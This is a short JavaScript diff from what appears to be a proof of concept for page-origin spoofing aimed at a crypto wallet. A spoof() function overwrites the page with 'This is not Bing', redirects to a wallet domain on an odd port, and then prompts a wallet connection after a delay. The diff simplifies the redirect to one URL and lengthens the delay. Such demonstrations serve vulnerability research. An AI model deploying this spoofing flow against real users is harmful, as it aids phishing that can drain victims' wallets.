@@ -25,7 +25,7 @@
       spoof();
 
       // Wait approximately 1 second
-      await delay(1000);
+      await delay(4000);
 
       // Check for wallet connection
       const connected = await promptWalletConnection();
@@ -40,17 +40,9 @@
       }
     }
 
-    const spoofUrls = [
-      "https://bifrostwallet.com:1234",
-      "https://example.com:124",
-      "https://bifrostwallet.com:1234"
-    ];
-    let currentSpoofUrlIndex = 0;
-
     function spoof() {
       document.write("<h1>This is not Bing</h1>");
-      document.location = spoofUrls[currentSpoofUrlIndex];
-      currentSpoofUrlIndex = (currentSpoofUrlIndex + 1) % spoofUrls.length;
+      document.location = "https://bifrostwallet.com:1234";
     }
 
     function delay(ms) {
